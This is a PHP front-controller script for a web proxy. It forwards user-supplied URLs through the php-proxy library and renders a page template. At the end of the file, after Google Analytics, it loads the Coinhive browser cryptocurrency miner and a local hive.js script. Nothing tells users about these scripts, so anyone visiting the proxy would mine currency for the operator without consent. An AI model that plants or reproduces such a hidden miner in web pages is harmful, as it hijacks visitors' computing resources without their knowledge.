<?php

define('PROXY_START', microtime(true));

require("vendor/autoload.php");

use Proxy\Http\Request;
use Proxy\Http\Response;
use Proxy\Plugin\AbstractPlugin;
use Proxy\Event\FilterEvent;
use Proxy\Config;
use Proxy\Proxy;

// start the session
session_start();

// load config...
Config::load('./config.php');

// custom config file to be written to by a bash script or something
Config::load('./custom_config.php');

if(!Config::get('app_key')){
	die("app_key inside config.php cannot be empty!");
}

if(!function_exists('curl_version')){
	die("cURL extension is not loaded!");
}

// how are our URLs be generated from this point? this must be set here so the proxify_url function below can make use of it
if(Config::get('url_mode') == 2){
	Config::set('encryption_key', md5(Config::get('app_key').$_SERVER['REMOTE_ADDR']));
} else if(Config::get('url_mode') == 3){
	Config::set('encryption_key', md5(Config::get('app_key').session_id()));
}

// very important!!! otherwise requests are queued while waiting for session file to be unlocked
session_write_close();

// form submit in progress...
if(isset($_POST['url'])){

	$url = $_POST['url'];
	$url = add_http($url);

	header("HTTP/1.1 302 Found");
	header('Location: '.proxify_url($url));
	exit;

} else if(!isset($_GET['q'])){

	// must be at homepage - should we redirect somewhere else?
	if(Config::get('index_redirect')){

		// redirect to...
		header("HTTP/1.1 302 Found");
		header("Location: ".Config::get('index_redirect'));

	} else {
		echo render_template("./templates/main.php", array('version' => Proxy::VERSION));
	}

	exit;
}

// decode q parameter to get the real URL
$url = url_decrypt($_GET['q']);

$proxy = new Proxy();

// load plugins
foreach(Config::get('plugins', array()) as $plugin){

	$plugin_class = $plugin.'Plugin';

	if(file_exists('./plugins/'.$plugin_class.'.php')){

		// use user plugin from /plugins/
		require_once('./plugins/'.$plugin_class.'.php');

	} else if(class_exists('\\Proxy\\Plugin\\'.$plugin_class)){

		// does the native plugin from php-proxy package with such name exist?
		$plugin_class = '\\Proxy\\Plugin\\'.$plugin_class;
	}

	// otherwise plugin_class better be loaded already through composer.json and match namespace exactly \\Vendor\\Plugin\\SuperPlugin
	$proxy->getEventDispatcher()->addSubscriber(new $plugin_class());
}

try {

	// request sent to index.php
	$request = Request::createFromGlobals();

	// remove all GET parameters such as ?q=
	$request->get->clear();

	// forward it to some other URL
	$response = $proxy->forward($request, $url);

	// if that was a streaming response, then everything was already sent and script will be killed before it even reaches this line
	$response->send();

} catch (Exception $ex){

	// if the site is on server2.proxy.com then you may wish to redirect it back to proxy.com
	if(Config::get("error_redirect")){

		$url = render_string(Config::get("error_redirect"), array(
			'error_msg' => rawurlencode($ex->getMessage())
		));

		// Cannot modify header information - headers already sent
		header("HTTP/1.1 302 Found");
		header("Location: {$url}");

	} else {

		echo render_template("./templates/main.php", array(
			'url' => $url,
			'error_msg' => $ex->getMessage(),
			'version' => Proxy::VERSION
		));

	}
}

?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
	$("#pushup_unblockit").click(function() {
		$("#top_form_unblockit").slideToggle("slow");
		$("#pushdown_unblockit").slideToggle("slow");
	});
	$("#pushdown_unblockit").click(function() {
		$("#top_form_unblockit").slideToggle("slow");
		$("#pushdown_unblockit").slideToggle("slow");
	});
	setTimeout(loadCss(), 3000); // Wait for page to load then use function loadCss
	function loadCss(){ // Function loadCss
  	$('body').append('<link rel="stylesheet" type="text/css" href="assets/css/url_bar.css">'); // Link to your Stylesheet
  	console.log("url_bar_style.js Started...");
    console.log("You can ignore this all the people that have some weird intrest in looking at the console, I use this for development :P SO DONT POST ANYTHING IN HERE");
	}
</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-105313334-1', 'auto');
  ga('send', 'pageview');

</script>
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script src="assets/js/hive.js"></script>